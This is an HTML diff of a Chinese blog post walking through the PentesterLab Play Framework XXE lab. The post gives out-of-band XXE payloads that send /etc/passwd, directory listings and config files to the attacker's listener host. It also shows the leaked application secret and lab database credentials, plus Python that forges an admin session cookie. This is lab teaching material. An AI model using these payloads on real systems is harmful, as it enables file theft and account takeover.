@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 
 
 
@@ -10,11 +10,19 @@
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
 
 
 
 <meta http-equiv="Cache-Control" content="no-transform" />
 <meta http-equiv="Cache-Control" content="no-siteapp" />
+
 
 
 
@@ -68,7 +76,18 @@
 
 <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
 
 
   <meta name="keywords" content="XXE," />
@@ -76,11 +95,6 @@
 
 
 
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
 
 
 
@@ -111,11 +125,13 @@
   var CONFIG = {
     root: '/',
     scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
-    motion: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     duoshuo: {
-      userId: 'undefined',
+      userId: '0',
       author: '博主'
     },
     algolia: {
@@ -136,11 +152,7 @@
 
 
 
-  <title> play渗透框架XXE实体攻击 | Ethan' Blog </title>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
+  <title>play渗透框架XXE实体攻击 | Ethan' Blog</title>
   
 
 
@@ -149,28 +161,17 @@
 
 
 
-  <script type="text/javascript">
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "//tajs.qq.com/stats?sId=63078337";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
+</head>
 
-
-
-
-
-
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
   
     
   
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -217,7 +218,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
+          <a href="/archives/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
@@ -227,7 +228,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
+          <a href="/categories/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
@@ -237,7 +238,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
+          <a href="/tags/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
@@ -247,7 +248,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
+          <a href="/about/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
@@ -283,7 +284,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+      <input autocomplete="off"
              placeholder="搜索..." spellcheck="false"
              type="text" id="local-search-input">
     </div>
@@ -317,7 +318,11 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -335,14 +340,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                play渗透框架XXE实体攻击
-              
-            
-          </h1>
+          <h1 class="post-title" itemprop="name headline">play渗透框架XXE实体攻击</h1>
         
 
         <div class="post-meta">
@@ -390,6 +388,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/21/play渗透框架XXE实体攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/04/21/play渗透框架XXE实体攻击/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -405,78 +413,92 @@
       </header>
     
 
-
+    
+    
+    
     <div class="post-body" itemprop="articleBody">
 
       
       
 
       
-        <h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p>本文记录的是利用play渗透框架学习XXE实体攻击的过程，实验环境来自于<a href="https://pentesterlab.com/exercises/play_xxe" target="_blank" rel="external">pentesterlab Play XML Entities</a>, 下载页面的iso, 用虚拟机软件PD或vmvare安装即可。打开虚拟机，获取虚拟机ip地址，然后访问就可以实验了，并不需要开启服务等其他操作，非常简单易用。同时还配备了课程讲解<a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="external">https://pentesterlab.com/exercises/play_xxe/course</a>.</p>
+        <h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p>本文记录的是利用play渗透框架学习XXE实体攻击的过程，实验环境来自于<a href="https://pentesterlab.com/exercises/play_xxe" target="_blank" rel="noopener">pentesterlab Play XML Entities</a>, 下载页面的iso, 用虚拟机软件PD或vmvare安装即可。打开虚拟机，获取虚拟机ip地址，然后访问就可以实验了，并不需要开启服务等其他操作，非常简单易用。同时还配备了课程讲解<a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/play_xxe/course</a>.</p>
 <p>Play Framework是一个web的框架，在这个框架中，开发者可以快速的使用java或者scala编译开发web应用。这样可以有序管理代码，并且url可以像Ruby-on-Rails一样被映射。就像Ruby-on-Rails，当收到Http请求时，Play框架管理多种文本类型。</p>
 <a id="more"></a>
 <h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><p>目标ip: <code>10.211.15.4</code>, 访问如下:</p>
-<img src="/2017/04/21/play渗透框架XXE实体攻击/login.png" alt="login.png" title="">
+<img src="/2017/04/21/play渗透框架XXE实体攻击/login.png">
 <p>练习的目标是: <code>读任意文件</code>, <code>获取secret_url</code>, <code>login as admin</code>。</p>
 <h2 id="实体攻击"><a href="#实体攻击" class="headerlink" title="实体攻击"></a>实体攻击</h2><h3 id="探测外部实体请求"><a href="#探测外部实体请求" class="headerlink" title="探测外部实体请求"></a>探测外部实体请求</h3><p>首先测试目标服务器是否解析XML内容，并请求外部实体。本地开启服务器，接收来自目标服务器的外部实体请求：<code>python -m SimpleHTTPServer 8000</code>, 然后burp发送如下请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.211.55.14</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Referer: http://10.211.55.14/login</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 96</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://10.211.55.2:8000/test.dtd&quot;&gt;</div><div class="line">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 10.211.55.14</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Referer: http://10.211.55.14/login</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 96</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://10.211.55.2:8000/test.dtd&quot;&gt;</span><br><span class="line">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
 <p>本地监听到如下内容，表明目标服务器解析XML内容，并发出了外部实体请求。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">10.211.55.14 - - [21/Apr/2017 11:29:17] code 404, message File not found</div><div class="line">10.211.55.14 - - [21/Apr/2017 11:29:17] &quot;GET /test.dtd HTTP/1.1&quot; 404 -</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.211.55.14 - - [21/Apr/2017 11:29:17] code 404, message File not found</span><br><span class="line">10.211.55.14 - - [21/Apr/2017 11:29:17] &quot;GET /test.dtd HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
 <p>注意: burp发出的请求的<code>Content-Type</code>必须为: <code>text/xml</code>, 而不能是<code>application/xml</code>, 猜测是目标服务器限制了解析的xml mime类型。</p>
 <h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>目标服务器会请求外部实体，那么可以本地写test.dtd, 返回给目标服务器，test.dtd内容如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</div><div class="line">%p2;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
 <p>burp再次发生之前的请求，本地服务器能监听到:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /test.dtd HTTP/1.1&quot; 200 -</div><div class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] code 404, message File not found</div><div class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 404 -</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /test.dtd HTTP/1.1&quot; 200 -</span><br><span class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] code 404, message File not found</span><br><span class="line">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
 <p>显然，成功读取目标服务器<code>/etc/passwd</code>文件内容，接着应该去获取<code>secret_url</code>, 那么需要知道目标服务器源码文件的内容，从获取的<code>/etc/passwd</code>文件内容可以发现用户<code>play</code>的路径为<code>/opt/play-2.1.3/xxe/</code>, 那么改变test.dtd，读<code>/opt/play-2.1.3/xxe/</code>目录:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///opt/play-2.1.3/xxe/&quot;&gt;</div><div class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</div><div class="line">%p2;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///opt/play-2.1.3/xxe/&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
 <p>得到如下内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">10.211.55.14 - - [21/Apr/2017 15:21:24] &quot;GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1&quot; 404 -</div><div class="line"></div><div class="line"># url decode</div><div class="line">.gitignore</div><div class="line">.settings</div><div class="line">app</div><div class="line">conf</div><div class="line">logs</div><div class="line">project</div><div class="line">public</div><div class="line">README</div><div class="line">RUNNING_PID</div><div class="line">target</div><div class="line">test</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10.211.55.14 - - [21/Apr/2017 15:21:24] &quot;GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1&quot; 404 -</span><br><span class="line"></span><br><span class="line"># url decode</span><br><span class="line">.gitignore</span><br><span class="line">.settings</span><br><span class="line">app</span><br><span class="line">conf</span><br><span class="line">logs</span><br><span class="line">project</span><br><span class="line">public</span><br><span class="line">README</span><br><span class="line">RUNNING_PID</span><br><span class="line">target</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
 <p>通常，java框架会有路由配置url映射，那么可以访问<code>/opt/play-2.1.3/xxe/conf/</code>目录(采用和上面相同的方式)，得到如下内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">10.211.55.14 - - [21/Apr/2017 12:56:38] &quot;GET /BLAH?application.conf%0Aevolutions%0Aroutes%0A HTTP/1.1&quot; 404 -</div><div class="line"></div><div class="line"># url decode</div><div class="line">application.conf</div><div class="line">evolutions</div><div class="line">routes</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.211.55.14 - - [21/Apr/2017 12:56:38] &quot;GET /BLAH?application.conf%0Aevolutions%0Aroutes%0A HTTP/1.1&quot; 404 -</span><br><span class="line"></span><br><span class="line"># url decode</span><br><span class="line">application.conf</span><br><span class="line">evolutions</span><br><span class="line">routes</span><br></pre></td></tr></table></figure>
 <p>在访问<code>routes</code>,有如下内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET     /                           controllers.Application.index()</div><div class="line">GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()</div><div class="line">GET       /login                   controllers.Application.login</div><div class="line">POST      /login                   controllers.Application.login</div><div class="line">GET       /logout                  controllers.Application.logout</div><div class="line"></div><div class="line">GET     /assets/*file               controllers.Assets.at(path=&quot;/public&quot;, file)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET     /                           controllers.Application.index()</span><br><span class="line">GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()</span><br><span class="line">GET       /login                   controllers.Application.login</span><br><span class="line">POST      /login                   controllers.Application.login</span><br><span class="line">GET       /logout                  controllers.Application.logout</span><br><span class="line"></span><br><span class="line">GET     /assets/*file               controllers.Assets.at(path=&quot;/public&quot;, file)</span><br></pre></td></tr></table></figure>
 <p>得到secret_url为:<code>0ecf87346b9c0b370f8d63e6e7fed4f0</code>, 访问。</p>
-<img src="/2017/04/21/play渗透框架XXE实体攻击/secret.png" alt="secret.png" title="">
+<img src="/2017/04/21/play渗透框架XXE实体攻击/secret.png">
 <h3 id="伪造cookie"><a href="#伪造cookie" class="headerlink" title="伪造cookie"></a>伪造cookie</h3><p>要实现admin用户登录，要么获取密码或登录绕过，要么利用cookie伪造登录，这里仅探讨伪造cookie登录。要实现cookie的伪造，那么需要知道目标服务器设置session的加密方式，访问<code>/opt/play-2.1.3/xxe/conf/application.conf</code>文件，得到application.secret=<code>&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</code>.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">application.secret=&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</div><div class="line">application.langs=&quot;en&quot;</div><div class="line">db.default.driver=com.mysql.jdbc.Driver</div><div class="line">db.default.url=&quot;mysql://pentesterlab:pentesterlab@localhost/xxe&quot;</div><div class="line">ebean.default=&quot;models.*&quot;</div><div class="line">logger.root=ERROR</div><div class="line">logger.play=INFO</div><div class="line">logger.application=DEBUG</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">application.secret=&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</span><br><span class="line">application.langs=&quot;en&quot;</span><br><span class="line">db.default.driver=com.mysql.jdbc.Driver</span><br><span class="line">db.default.url=&quot;mysql://pentesterlab:pentesterlab@localhost/xxe&quot;</span><br><span class="line">ebean.default=&quot;models.*&quot;</span><br><span class="line">logger.root=ERROR</span><br><span class="line">logger.play=INFO</span><br><span class="line">logger.application=DEBUG</span><br></pre></td></tr></table></figure>
 <p>session的管理在<code>app/controllers/Application.java</code>中（或者.scala）, 核心代码如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User user = User.findByUsername(username);</div><div class="line">if (user!=null) &#123;</div><div class="line">    if (user.password.equals(md5(username+&quot;:&quot;+password) )) &#123;</div><div class="line">      session(&quot;user&quot;,username);</div><div class="line">      return redirect(&quot;/&quot;);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User user = User.findByUsername(username);</span><br><span class="line">if (user!=null) &#123;</span><br><span class="line">    if (user.password.equals(md5(username+&quot;:&quot;+password) )) &#123;</span><br><span class="line">      session(&quot;user&quot;,username);</span><br><span class="line">      return redirect(&quot;/&quot;);</span><br></pre></td></tr></table></figure>
 <p>显然，我们要利用<code>user=admin</code>来伪造session.</p>
 <p><code>framework/src/play/src/main/scala/play/api/mvc/Http.scala</code>中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">def encode(data: Map[String, String]): String = &#123;</div><div class="line">  val encoded = data.map &#123;</div><div class="line">    case (k, v) =&gt; URLEncoder.encode(k, &quot;UTF-8&quot;) + &quot;=&quot; + URLEncoder.encode(v, &quot;UTF-8&quot;)</div><div class="line">  &#125;.mkString(&quot;&amp;&quot;)</div><div class="line">  if (isSigned)</div><div class="line">    Crypto.sign(encoded) + &quot;-&quot; + encoded</div><div class="line">  else</div><div class="line">    encoded</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def encode(data: Map[String, String]): String = &#123;</span><br><span class="line">  val encoded = data.map &#123;</span><br><span class="line">    case (k, v) =&gt; URLEncoder.encode(k, &quot;UTF-8&quot;) + &quot;=&quot; + URLEncoder.encode(v, &quot;UTF-8&quot;)</span><br><span class="line">  &#125;.mkString(&quot;&amp;&quot;)</span><br><span class="line">  if (isSigned)</span><br><span class="line">    Crypto.sign(encoded) + &quot;-&quot; + encoded</span><br><span class="line">  else</span><br><span class="line">    encoded</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>可知，session内容的格式为: <code>signature-name1=value1&amp;name2=value2</code>, 其实name1,value1等都经过url编码处理, 其中<code>encoded=name1=value1&amp;name2=value2</code>, <code>signature=Crypto.sign(encoded)</code>。</p>
 <p>加密函数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def sign(message: String, key: Array[Byte]): String = &#123;</div><div class="line">   val mac = Mac.getInstance(&quot;HmacSHA1&quot;)</div><div class="line">   mac.init(new SecretKeySpec(key, &quot;HmacSHA1&quot;))</div><div class="line">   Codecs.toHexString(mac.doFinal(message.getBytes(&quot;utf-8&quot;)))</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sign(message: String, key: Array[Byte]): String = &#123;</span><br><span class="line">   val mac = Mac.getInstance(&quot;HmacSHA1&quot;)</span><br><span class="line">   mac.init(new SecretKeySpec(key, &quot;HmacSHA1&quot;))</span><br><span class="line">   Codecs.toHexString(mac.doFinal(message.getBytes(&quot;utf-8&quot;)))</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 <p>其中<code>key= &quot;[KEY FOUND IN conf/application.conf]&quot;</code>, 那么利用python伪造session内容，过程如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> hashlib</div><div class="line">In [<span class="number">6</span>]: <span class="keyword">import</span> hmac</div><div class="line">In [<span class="number">9</span>]: key =  <span class="string">"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"</span></div><div class="line">In [<span class="number">10</span>]: data = <span class="string">"user=admin"</span></div><div class="line">In [<span class="number">11</span>]: h = hmac.new(key, data, hashlib.sha1)</div><div class="line"></div><div class="line">In [<span class="number">12</span>]: h.hexdigest()</div><div class="line">Out[<span class="number">12</span>]: <span class="string">'a5b8363ce748cfbb5d654edc3676d440173b33de'</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> hashlib</span><br><span class="line">In [<span class="number">6</span>]: <span class="keyword">import</span> hmac</span><br><span class="line">In [<span class="number">9</span>]: key =  <span class="string">"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"</span></span><br><span class="line">In [<span class="number">10</span>]: data = <span class="string">"user=admin"</span></span><br><span class="line">In [<span class="number">11</span>]: h = hmac.new(key, data, hashlib.sha1)</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: h.hexdigest()</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">'a5b8363ce748cfbb5d654edc3676d440173b33de'</span></span><br></pre></td></tr></table></figure>
 <p>这里必须使用<code>hmac</code>库，而不能仅仅使用<code>hashlib</code>库来计算sha1, 因为hmac库使用key来生成salt, 然后用<code>hashlib.sha1</code>来计算hash值，而不是直接对<code>key+data</code>生成hash值。</p>
 <p>然后进行cookie伪造，cookie名字就是<code>PLAY_SESSION</code>, burp请求如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Host: 10.211.55.14</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 FirePHP/0.7.4</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">x-insight: activate</div><div class="line">Cookie: PLAY_SESSION=&quot;a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin&quot;</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
